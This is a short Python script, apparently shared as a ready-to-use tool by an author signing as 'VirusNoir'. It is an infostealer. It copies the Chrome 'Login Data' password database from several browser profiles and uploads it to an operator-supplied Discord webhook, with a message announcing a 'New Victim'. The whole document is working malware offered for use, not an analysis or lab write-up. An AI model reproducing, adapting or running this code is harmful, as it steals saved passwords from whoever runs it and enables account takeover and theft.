#Script By VirusNoir

import os
from shutil import copy2
import requests
from discord_webhook import *
webhook = "" #Enter Your Webhook Here !!
w = DiscordWebhook(url=webhook,username="VirusNoir",avatar_url="https://cdn.discordapp.com/attachments/970344085594472478/1028801041837330484/vn.png",content="**New Victim !!**, **Script By VirusNoir =** ***http://savens.ml/github.php?user=virusnoir*** ```\nFollow Me On Instagram : \nAcc 1 : @not_elli0t\nAcc 2 : @virus__noir```")
s = requests.Session()
local = os.getenv("LOCALAPPDATA") 
google_paths = [
            local + '\\Google\\Chrome\\User Data\\Default',
            local + '\\Google\\Chrome\\User Data\\Profile 1',
            local + '\\Google\\Chrome\\User Data\\Profile 2',
            local + '\\Google\\Chrome\\User Data\\Profile 3',
            local + '\\Google\\Chrome\\User Data\\Profile 4',
            local + '\\Google\\Chrome\\User Data\\Profile 5',
        ]
def heck():
    def passwords():
            for path in google_paths:
                path += '\\Login Data'
                if os.path.exists(path):
                    copy2(path, local+"\\vault.db")
                    s.post(webhook,files={'file': ('./vault.db', open(local+"\\vault.db", 'rb'))})

                    
    passwords()

if __name__=='__main__':
    heck()
